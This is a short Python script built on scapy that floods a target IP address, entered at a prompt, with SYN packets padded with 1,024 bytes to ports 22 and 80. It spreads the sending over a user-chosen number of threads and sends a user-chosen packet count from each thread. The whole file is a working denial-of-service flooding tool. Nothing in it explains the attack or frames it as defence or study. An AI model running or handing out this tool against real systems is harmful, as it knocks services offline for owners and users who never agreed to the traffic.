from scapy.all import *
import threading
import signal
import sys

# Global variables
send_lock = threading.Lock()
stop_event = threading.Event()

def generate_packet(target_ip):
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=[22, 80], seq=12345, ack=1000, window=1000, flags=["S"])
    raw = Raw(b"X" * 1024)
    return ip / tcp / raw

def send_packets_thread(target_ip, num_packets):
    packets = [generate_packet(target_ip) for _ in range(num_packets)]

    try:
        with send_lock:
            send(packets, verbose=0)
        if not stop_event.is_set():
            print(f"Thread sent {num_packets} packets successfully.")
    except KeyboardInterrupt:
        print("Thread KeyboardInterrupt. Stopping the thread gracefully.")
    finally:
        stop_event.set()

def signal_handler(sig, frame):
    print("Main KeyboardInterrupt. Stopping threads gracefully.")
    # Set the stop event to signal threads to stop
    stop_event.set()
    # Wait for threads to finish
    sys.exit(0)

def send_packets(target_ip, num_packets, num_threads):
    # Register the signal handler
    signal.signal(signal.SIGINT, signal_handler)

    # Create threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_packets_thread, args=(target_ip, num_packets))
        threads.append(thread)

    try:
        # Start threads
        for thread in threads:
            thread.start()

        # Wait for all threads to finish
        for thread in threads:
            thread.join()

        print(f"Sent {num_threads * num_packets} packets successfully.")
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    target_ip = input("Enter the target IP: ")
    num_packets = int(input("Enter the number of packets to send per thread: "))
    num_threads = int(input("Enter the number of threads: "))

    send_packets(target_ip, num_packets, num_threads)
